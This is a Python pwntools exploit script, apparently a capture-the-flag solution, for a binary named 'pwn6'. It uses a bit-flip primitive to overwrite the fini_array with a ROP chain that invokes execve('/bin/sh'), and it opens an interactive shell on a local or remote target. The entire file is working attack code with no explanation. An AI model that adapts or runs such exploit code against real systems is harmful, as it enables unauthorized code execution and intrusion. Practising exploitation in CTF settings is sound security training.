#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn6'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# helper
def modify(addr,data):
    for i in range(8*8):
        if data&(1<<i):
            payload = "%s:%d"%(hex(addr+i/8),i%8)
            sla('\x1B[1maddr:\x1B[m ',payload)

# info
# gadget
prdi = 0x004006a6 # pop rdi ; ret
prsi = 0x00410433
prdx = 0x00449af5
prax = 0x0045fdf4
syscall = 0x00449285
leave = 0x00400c20

# elf, libc
fini_array = 0x6d2150
raw = [0x0000000000400b00,   # 0 -> leave 
       0x0000000000400590,   # 1 -- nop
       0x0000000d00000002,   # 2 -> prdi
       0x00000000004ada80,   # 3 -> 0x6d21a8 -> /bin/sh
       0x00000000004ada60,   # 4 -> prsi
       0x0000000000000000,   # 5 -- 0 
       0x00000000006d44c0,   # 6 -> prdx
       0x0000000000000001,   # 7 -> 0
       0x00000000006d4440,   # 8 -> prax
       0x0000000000000001,   # 9 -> 0x3b
       0x00000000004b2680,   # 10-> syscall
       0x00000000004b25a0,   # 11-> /bin/sh
       0x00000000004b2320,0x00000000004b27e0,0x00000000004b25c0,0x00000000004b22f0,0x0000000000000000,0x00000000004b22e0,0x00000000004b22c0,0x00000000004b2280]

ropchain = [leave,
            0x0000000000400590,
            prdi,
            0x6d21a8,
            prsi,
            0,
            prdx,
            0,
            prax,
            0x3b,
            syscall,
            u64('/bin/sh\0')]

modify(0x6D7330,0x80000000)
for i in range(len(ropchain)):
    modify(fini_array+8*i,raw[i]^ropchain[i])
# debug('b *0x400590')
sla('\x1B[1maddr:\x1B[m ','0x6D7330:9')

p.interactive()